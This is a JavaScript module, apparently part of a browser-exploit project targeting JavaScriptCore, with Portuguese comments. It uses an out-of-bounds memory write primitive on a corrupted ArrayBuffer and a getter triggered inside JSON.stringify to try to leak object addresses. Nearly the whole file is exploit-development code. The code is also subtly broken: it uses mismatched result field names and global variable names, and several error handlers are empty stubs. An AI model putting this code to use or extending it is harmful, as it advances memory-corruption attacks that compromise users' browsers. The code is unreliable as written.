// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeakV5";
let getter_called_flag = false;
let current_test_results = { /* Estrutura de resultados detalhada */ };

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN = 0xFEFEFEFE;
const OOB_AB_SNOOP_MAX_BYTES = 0x1000; // Sondar até 4KB

// Variável de escopo de módulo para o objeto cujo endereço queremos vazar
let object_to_leak_global_ref; 

class CheckpointForStringifierLeakV5 {
    constructor(id) {
        this.id_marker = `StrLeakV5Chkpt-${id}`;
        this.target_prop = null; // Será preenchido com object_to_leak_global_ref
        this.other_data = "CheckpointData_" + "PAD".repeat(30);
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeakV5_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado, iniciando testes de vazamento via Stringifier.",
            error: null, details_getter: "", 
            json_output_internal_leaks: [], 
            oob_ab_leaks: [] 
        };
        let details_log = [];
        let leak_found_in_getter = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB ou oob_ab não disponíveis.");
            }

            // 1. Ler e logar o valor em 0x6C (afetado pelo Stringifier externo)
            try {
                const val_0x6C = oob_read_absolute(0x6C, 8);
                details_log.push(`Valor em oob_data[0x6C] no início do getter: ${val_0x6C.toString(true)}`);
                logS3(details_log[details_log.length-1], "info", FNAME_GETTER);
            } catch (e_read0x6c) { details_log.push(`Erro ao ler 0x6C: ${e_read0x6c.message}`); }


            // 2. Preencher oob_array_buffer_real com um padrão (exceto 0x6C e 0x70)
            const fill_limit = Math.min(OOB_AB_SNOOP_MAX_BYTES, oob_array_buffer_real.byteLength);
            logS3(`DENTRO DO GETTER: Preenchendo oob_ab de 0 a ${toHex(fill_limit)} com ${toHex(OOB_AB_FILL_PATTERN)}...`, "info", FNAME_GETTER);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= 0x6C && offset < 0x6C + 8) ) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_ab preenchido com padrão.`);

            // 3. Criar objeto de stress para JSON.stringify interno, usando o target global
            if (!object_to_leak_global_ref) throw new Error("Objeto alvo global não definido no getter.");
            
            let stress_obj_for_json = {
                id_stress: "StressObjectForInternalStringify",
                main_target: object_to_leak_global_ref,
                text_payload1: "VERY_LONG_STRING_TO_FORCE_BUFFER_OPS_" + "A".repeat(200),
                nested_structure: {
                    sub_target: object_to_leak_global_ref,
                    sub_text: "AnotherLongString_" + "B".repeat(150)
                },
                numeric_array: Array.from({length: 20}, (_,k) => Date.now() + k)
            };
            details_log.push(`Objeto de stress interno (ref ${object_to_leak_global_ref.unique_id_marker}) criado.`);

            // 4. Chamar JSON.stringify internamente
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_str_output = "";
            try {
                internal_json_str_output = JSON.stringify(stress_obj_for_json);
                details_log.push(`Stringify interno completado. Output length: ${internal_json_str_output.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno output (primeiros 100): ${internal_json_str_output.substring(0, 100)}...`, "info", FNAME_GETTER);

                // 4a. Analisar a string JSON interna por padrões hexadecimais
                const hex_ptr_regex = /0x[0-9a-fA-F]{7,16}/g; 
                let json_matches = internal_json_str_output.match(hex_ptr_regex);
                if (json_matches) {
                    details_log.push(`Potenciais ponteiros na string JSON interna: ${json_matches.join(', ')}`);
                    logS3(`POTENCIAIS PONTEIROS NA STRING JSON INTERNA: ${json_matches.join(', ')}`, "leak", FNAME_GETTER);
                    current_test_results.leaks_in_json_output = json_matches;
                    leak_found_in_getter = true;
                }
            } catch (e_json_int_getter) { /* ... como antes ... */ }
            
            // 5. Sondar o oob_array_buffer_real por escritas/vazamentos
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações/ponteiros...", "info", FNAME_GETTER);
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) {
                let is_trigger_area = (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8);
                let is_0x6C_area = (offset >= 0x6C && offset < 0x6C + 8);
                if (is_trigger_area && is_0x6C_area) { /* Ambos, priorizar trigger*/ is_0x6C_area = false; }


                try {
                    const dword_val = oob_read_absolute(offset, 4);
                    let is_expected_pattern = (dword_val === OOB_AB_FILL_PATTERN);
                    
                    if (is_trigger_area) { // Se for área do trigger, esperamos o CORRUPTION_VALUE_TRIGGER
                        const trigger_part_low = CORRUPTION_VALUE_TRIGGER.low();
                        const trigger_part_high = CORRUPTION_VALUE_TRIGGER.high();
                        if (offset === CORRUPTION_OFFSET_TRIGGER && dword_val !== trigger_part_low) is_expected_pattern = false;
                        else if (offset === CORRUPTION_OFFSET_TRIGGER + 4 && dword_val !== trigger_part_high) is_expected_pattern = false;
                        else if (offset === CORRUPTION_OFFSET_TRIGGER && dword_val === trigger_part_low) is_expected_pattern = true; // É o esperado
                        else if (offset === CORRUPTION_OFFSET_TRIGGER + 4 && dword_val === trigger_part_high) is_expected_pattern = true; // É o esperado
                    } else if (is_0x6C_area) {
                        // Para 0x6C, esperamos 0xFFFFFFFF nos 4 bytes altos e o padrão baixo original nos 4 baixos.
                        // Esta sondagem é após o JSON.stringify interno. O valor de 0x6C já foi logado no início do getter.
                        // Aqui, apenas verificamos se mudou do padrão OOB_AB_FILL_PATTERN.
                        // Se o valor lido em 0x6C (ou 0x6C+4) for diferente do OOB_AB_FILL_PATTERN, será logado abaixo.
                    }


                    if (!is_expected_pattern) {
                        const qword_context_val = oob_read_absolute(offset, 8);
                        const leak_item = {
                            offset: toHex(offset), 
                            value_u32: toHex(dword_val), 
                            value_u64_context: qword_context_val.toString(true), 
                            note: is_trigger_area ? "Trigger Value Mismatch?" : (is_0x6C_area ? "0x6C Area Mismatch?" : "Data Overwritten")
                        };
                        current_test_results.leaks_in_oob_ab.push(leak_item);
                        logS3(`LEAK/ALTERAÇÃO oob_data[${toHex(offset)}] = ${toHex(dword_val)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN)}). QWORD_CTX=${qword_context_val.toString(true)}`, "leak", FNAME_GETTER);
                        leak_found_in_getter = true;
                        
                        // Heurística de ponteiro
                        if ((qword_context_val.high() > 0x0001 && qword_context_val.high() < 0x8000) && !(qword_context_val.low() === 0xFFFFFFFF && qword_context_val.high() === 0xFFFFFFFF)) {
                            logS3(`  -> VALOR ALTAMENTE SUSPEITO DE PONTEIRO (oob_ab)! ${qword_context_val.toString(true)}`, "vuln", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop_g) {}
            }
            if (current_test_results.leaks_in_oob_ab.length > 0) {
                 details_log.push(`${current_test_results.leaks_in_oob_ab.length} alterações/leaks potenciais no oob_ab.`);
            }

            if (leak_found_in_getter) {
                current_test_results.success = true;
                current_test_results.message = "Potencial vazamento de informação detectado (na string JSON ou no oob_ab)!";
            } else {
                current_test_results.message = "Nenhum vazamento óbvio via Stringifier (nem na string JSON, nem no oob_ab).";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) { /* ... */ }
        return { "getter_stringifier_leak_v5_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeakV5.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { 
            id: this.id_marker, 
            stringified_target_prop: this.target_prop,
            processed_by_str_leak_v5_test: true 
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierLeakTestRunnerV5"; // Nome do runner
    logS3(`--- Iniciando Teste de Vazamento via Stringifier Corrompido (v5) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };
    object_to_leak_global_ref = null; // CORRIGIDO: Declarar/Resetar aqui

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) {  return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Criar o objeto alvo global ANTES do gatilho
        object_to_leak_global_ref = { "unique_id_marker": 0xABCDE000 + Math.floor(Math.random()*0xFFF) };
        logS3(`Objeto alvo global para addrof criado: ID=${toHex(object_to_leak_global_ref.unique_id_marker)}`, "info", FNAME_TEST_RUNNER);

        // Escrita OOB Gatilho em 0x70
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierLeakV5(1);
        checkpoint_obj.target_prop = object_to_leak_global_ref; // Atribuir ao checkpoint
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}, target_prop preenchida.`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output_from_runner = "";
        try {
            final_json_output_from_runner = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Output (parcial): ${final_json_output_from_runner.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
            
            // Verificar se a string JSON EXTERNA contém algum ponteiro (além do que o getter pode ter encontrado)
            const hex_ptr_regex_runner_check = /0x[0-9a-fA-F]{7,16}/g;
            let matches_in_runner_json_output = final_json_output_from_runner.match(hex_ptr_regex_runner_check);
            if (matches_in_runner_json_output && current_test_results) {
                 logS3(`String JSON EXTERNA continha padrões hex: ${matches_in_runner_json_output.join(',')}`, "leak", FNAME_TEST_RUNNER);
                 // Não marcar como success global aqui, pois o getter tem sua própria lógica de sucesso.
                 // Apenas adicionar aos leaks.
                 if (!current_test_results.leaks_in_json_output) current_test_results.leaks_in_json_output = [];
                 current_test_results.leaks_in_json_output.push(...matches_in_runner_json_output);
            }
        } catch (e_json_ext) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        // ... (logging como na versão anterior, usando current_test_results)
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK (v5): SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK (v5): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaks_in_json_output && current_test_results.leaks_in_json_output.length > 0) {
            logS3("--- Potenciais Ponteiros na String JSON (do Getter ou Runner) ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_json_output.forEach(ptr_str => {
                logS3(`  ${ptr_str}`, "leak", FNAME_TEST_RUNNER);
            });
        }
        if (current_test_results.leaks_in_oob_ab && current_test_results.leaks_in_oob_ab.length > 0) {
            logS3("--- Dados Alterados/Ponteiros Vazados no oob_array_buffer_real (do Getter) ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value || item.value_hex} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
    } else {
         logS3("RESULTADO TESTE STRINGIFIER LEAK (v5): Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    if (typeof global_object_for_leak_address_ref_global !== 'undefined') { // CORRIGIDO: Verifica antes de anular
        object_to_leak_address_ref_global = null;
    }
    logS3(`--- Teste de Leak via Stringifier Corrompido (v5) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
